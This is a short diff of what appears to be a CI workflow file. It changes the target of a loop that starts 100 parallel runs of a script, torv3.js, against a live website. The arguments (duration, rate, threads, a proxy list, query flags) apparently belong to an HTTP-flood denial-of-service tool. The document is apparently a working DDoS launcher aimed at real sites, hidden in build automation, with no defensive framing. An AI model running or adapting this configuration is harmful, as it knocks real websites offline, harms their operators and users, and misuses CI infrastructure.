@@ -23,7 +23,7 @@ jobs:
           chmod +x torv3.js
           PIDS=()
           for i in {1..100}; do
-            timeout 70 node torv3.js GET https://oyunortagim.com/ 65 32 90 fres.txt --full --query 3
+            timeout 70 node torv3.js GET https://hexbear.xyz/ 65 32 90 fres.txt --full --query 3
             PIDS+=($!)
           done
           
